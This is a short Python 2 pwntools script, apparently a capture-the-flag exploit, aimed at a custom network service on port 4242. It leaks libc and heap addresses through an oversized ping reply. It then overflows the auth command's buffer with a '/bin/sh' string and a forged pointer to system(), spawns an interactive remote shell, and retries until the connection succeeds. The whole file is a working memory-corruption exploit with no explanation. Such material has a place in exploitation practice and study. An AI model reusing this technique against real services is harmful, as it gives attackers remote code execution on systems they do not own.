#!/usr/bin/python2

import sys

from pwn import *


def cmd_auth(pc, msg_len, uid):
    pc.send(msg_len)
    pc.send(uid)


def cmd_head(pc, idx):
    pc.send(idx)


def cmd_put(pc, idx_len, data_len, idx, data):
    pc.send(idx_len)
    pc.send(data_len)
    pc.send(idx)
    pc.send(data)


def cmd_get(pc, idx):
    pc.send(idx)


def cmd_ping(pc, data):
    pc.send(data)


def cmd_quit(pc):
    pass


CMD = {
    cmd_auth:   0,
    cmd_head:   1,
    cmd_put:    2,
    cmd_get:    3,
    cmd_ping:   4,
    cmd_quit:   5
}


def cmd_func(pc, cmd, buf_size, *args):
    pc.send(p64(CMD[cmd]))
    pc.send(p64(buf_size))
    cmd(pc, *args)


def main(pc):
    binsh = 0x181519
    system = 0x44c50

    cmd_func(pc, cmd_ping, 0x44, 'ping' + '\x00' * 0x40)
    resp = ''
    while len(resp) != 0x60:
        resp += pc.recv(0x60)

    libc_base = u64(resp[74:82]) - 0x39fb0
    heap_base = u64(resp[82:90]) - 0x10
    
    log.success('heap base @ ' + hex(heap_base))
    log.success('libc base @ ' + hex(libc_base))

    cmd = '/bin/sh\x00'

    cmd_func(pc, cmd_auth, 0xa9, p8(0xff), cmd + '\x01' * (0x88 - len(cmd)) + \
            p64(0x120) + p64(1) + p64(heap_base + 0x60) + \
            p64(libc_base + system))

    cmd_func(pc, cmd_quit, 0)

    pc.interactive()


if __name__ == '__main__':
    while True:
        pc = remote(sys.argv[1], 4242)
        try:
            main(pc)
            break
        except Exception:
            pass
        finally:
            pc.close()